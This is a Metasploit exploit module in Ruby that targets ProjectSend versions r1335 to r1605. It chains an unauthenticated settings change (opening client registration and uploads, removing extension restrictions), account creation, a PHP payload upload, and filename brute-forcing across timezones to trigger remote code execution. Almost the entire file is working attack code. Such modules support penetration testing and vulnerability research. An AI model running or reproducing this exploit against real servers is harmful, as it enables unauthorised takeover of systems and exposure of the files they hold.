class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Exploit::Retry
  prepend Msf::Exploit::Remote::AutoCheck
  
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ProjectSend r1335 - r1605 Unauthenticated Remote Code Execution',
        'Description' => %q{
          This module exploits an improper authorization vulnerability in ProjectSend versions r1335 through r1605.
          The vulnerability allows an unauthenticated attacker to obtain remote code execution by enabling user registration,
          disabling the whitelist of allowed file extensions, and uploading a malicious PHP file to the server.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Florent Sicchio', # Discovery
          'Hugo Clout', # Discovery
          'ostrichgolf' # Metasploit module
        ],
        'References' => [
          ['URL', 'https://github.com/projectsend/projectsend/commit/193367d937b1a59ed5b68dd4e60bd53317473744'],
          ['URL', 'https://www.synacktiv.com/sites/default/files/2024-07/synacktiv-projectsend-multiple-vulnerabilities.pdf'],
        ],
        'DisclosureDate' => '2024-07-19',
        'DefaultTarget' => 0,
        'Targets' => [
          ['ProjectSend r1335 - r1605', { 'Platform' => 'php', 'Arch' => ARCH_PHP }]
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
        }
      )
    )
    register_options(
      [
        OptString.new(
          'TARGETURI',
          [true, 'The TARGETURI for ProjectSend', '/']
        ),
        OptString.new(
          'REVERT_TO_DEFAULTS',
          [true, 'Revert application to secure default settings after exploitation. This will disable client registration, auto-approval of new clients, client file uploads, and enable upload restrictions for all users.', true]
        )
      ]
    )
  end

  def check
    cookie_jar.clear
    csrf_token = get_csrf_token

    # Obtain the current title of the website
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(datastore['TARGETURI'], 'index.php')
    })

    title_regex = %r{<title>.*?&raquo;\s+(.*?)</title>}
    original_title = res.body[title_regex, 1]

    # Generate a new title for the website
    random_new_title = Rex::Text.rand_text_alphanumeric(8)

    # Test if version is vulnerable, by attempting to change the title of the install
    params = {
      'csrf_token' => csrf_token,
      'section' => 'general',
      'this_install_title' => random_new_title
    }
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'], 'options.php'),
      'keep_cookie' => true,
      'vars_post' => params
    })

    unless res
      fail_with(Failure::NoAccess, 'Failed to connect to the provided URL')
    end

    # GET request to check if the title updated
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(datastore['TARGETURI'], 'index.php')
    })

    # Extract new title for comparison
    updated_title = res.body[title_regex, 1]

    if updated_title != random_new_title
      return CheckCode::Safe
    end
    
    # If the title was changed, it is vulnerable and we should restore the original title
    params = {
      'csrf_token' => csrf_token,
      'section' => 'general',
      'this_install_title' => original_title
    }
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'], 'options.php'),
      'keep_cookie' => true,
      'vars_post' => params
    })

    return CheckCode::Vulnerable
  end

  def get_csrf_token
    vprint_status('Extracting CSRF token...')
    # Make sure we start from a request with no cookies
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(datastore['TARGETURI'], 'index.php'),
      'keep_cookies' => true,
      'cookie' => '',
      'global' => false
    })

    # Obtain CSRF token
    csrf_regex = /csrf_token" value="([^"]+)"/
    csrf_token = res.body[csrf_regex, 1]

    if csrf_token.nil?
      fail_with(Failure::Unknown, 'CSRF token not found in the response')
    end

    vprint_good("Extracted CSRF token: #{csrf_token}")

    csrf_token
  end

  def enable_user_registration_and_auto_approve
    cookie_jar.clear
    csrf_token = get_csrf_token

    # Enable user registration, automatic approval of new users and allow all users to upload
    params = {
      'csrf_token' => csrf_token,
      'section' => 'clients',
      'clients_can_register' => 1,
      'clients_auto_approve' => 1,
      'clients_can_upload' => 1
    }
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'], 'options.php'),
      'cookie' => phpsessid,
      'vars_post' => params
    })

    # Check if we successfully enable client registration
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(datastore['TARGETURI'], 'index.php')
    })

    register_regex = /(.*?)Register as a new client./
    if res.body[register_regex, 1]
      print_good('Client registration successfully enabled')
    else
      fail_with(Failure::Unknown, 'Could not enable client registration')
    end
  end

  def register_new_user(username, password)
    cookie_jar.clear
    csrf_token = get_csrf_token

    # Create a new user with the previously generated username and password
    params = {
      'csrf_token' => csrf_token,
      'name' => username,
      'username' => username,
      'password' => password,
      'email' => Rex::Text.rand_mail_address,
      'address' => Rex::Text.rand_text_alphanumeric(8)
    }
    
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(datastore['TARGETURI'], 'register.php'),
        'keep_cookie' => true,
        'vars_post' => params
      })
    
    if res.code != 403
      print_good("User #{username} created with password #{password}")
    else
      fail_with(Failure::Unknown, 'Could not create a new user')
    end
  end

  def disable_upload_restrictions
    cookie_jar.clear
    csrf_token = get_csrf_token

    print_status('Disabling upload restrictions...')

    # Disable upload restrictions, to allow us to upload our shell
    params = {
      'csrf_token' => csrf_token,
      'section' => 'security',
      'file_types_limit_to' => 'noone'
    }

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'], 'options.php'),
      'keep_cookie' => true,
      'vars_post' => params
    })
  end

  def login_and_upload(username, password, filename)
    cookie_jar.clear
    csrf_token = get_csrf_token

    print_status("Logging in as #{username}...")

    # Attempt to login as our newly created user
    params = {
      'csrf_token' => csrf_token,
      'do' => 'login',
      'username' => username,
      'password' => password
    }

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'], 'index.php'),
      'vars_post' => params,
      'keep_cookies' => true
    })

    if res && res.headers['Set-Cookie']
      print_good("Logged in as #{username}")
    else
      fail_with(Failure::NoAccess, 'Failed to authenticate. This can happen, you should try to execute the exploit again')
    end

    # Craft the payload
    payload = get_write_exec_payload(unlink_self: true)
    data = Rex::MIME::Message.new
    data.add_part(filename, nil, nil, 'form-data; name="name"')
    data.add_part(payload, 'application/octet-stream', nil, 'form-data; name="file"; filename="blob"')
    post_data = data.to_s

    # Upload the shell using a POST request
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'], 'includes', 'upload.process.php'),
      'ctype' => "multipart/form-data; boundary=#{data.bound}",
      'data' => post_data,
      'keep_cookies' => true
    })

    # Check if the server confirms our upload as successful
    if res && res.body.include?('"OK":1')
      print_good("Successfully uploaded PHP file: #{filename}")
      res.headers['Date']
    else
      fail_with(Failure::Unknown, 'PHP file upload failed')
    end
  end

  def calculate_potential_filenames(username, upload_time, filename)
    # Hash the username
    hashed_username = Digest::SHA1.hexdigest(username)

    # Parse the upload time
    base_time = Time.parse(upload_time).utc

    # Array to store all possible URLs
    possible_urls = []

    # Iterate over all timezones
    (-12..14).each do |timezone|
      # Update the variable to reflect the currently looping timezone
      adj_time = base_time + (timezone * 3600)

      # Insert the potential URL into our array
      possible_urls << "#{adj_time.to_i}-#{hashed_username}-#{filename}"
    end

    possible_urls
  end

  def restore_default_settings
    cookie_jar.clear
    csrf_token = get_csrf_token

    # Disable user registration, automatic approval of new users and disallow all users to upload
    params = {
      'csrf_token' => csrf_token,
      'section' => 'clients',
      'clients_can_register' => 0,
      'clients_auto_approve' => 0,
      'clients_can_upload' => 0
    }
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'], 'options.php'),
      'cookie' => phpsessid,
      'vars_post' => params
    })

    # Check if we successfully disabled client registration
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(datastore['TARGETURI'], 'index.php')
    })

    register_regex = /(.*?)Register as a new client./

    if !res.body[register_regex, 1]
      print_good('Client registration successfully disabled')
    else
      fail_with(Failure::Unknown, 'Could not disable client registration')
    end

    print_status('Enabling upload restrictions...')

    # Enable upload restrictions for every user
    params = {
      'csrf_token' => csrf_token,
      'section' => 'security',
      'file_types_limit_to' => 'all'
    }

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'], 'options.php'),
      'cookie' => phpsessid,
      'vars_post' => params
    })
  end

  def trigger_shell(potential_urls)
    # Visit each URL, to trigger our payload - is there a way to end, if we get a session back from a call?
    potential_urls.each do |url|
      send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(datastore['TARGETURI'], 'upload', 'files', url)
      }, 1)
    end
  end

  def exploit

    enable_user_registration_and_auto_approve

    username = Faker::Internet.username
    password = Rex::Text.rand_text_alphanumeric(8)
    filename = Rex::Text.rand_text_alphanumeric(8) + '.php'

    register_new_user(username, password)

    disable_upload_restrictions

    upload_time = login_and_upload(username, password, filename)

    potential_urls = calculate_potential_filenames(username, upload_time, filename)

    if datastore['REVERT_TO_DEFAULTS']
      print_status('Reverting to default settings')
      restore_default_settings
    end

    trigger_shell(potential_urls)

  end
end
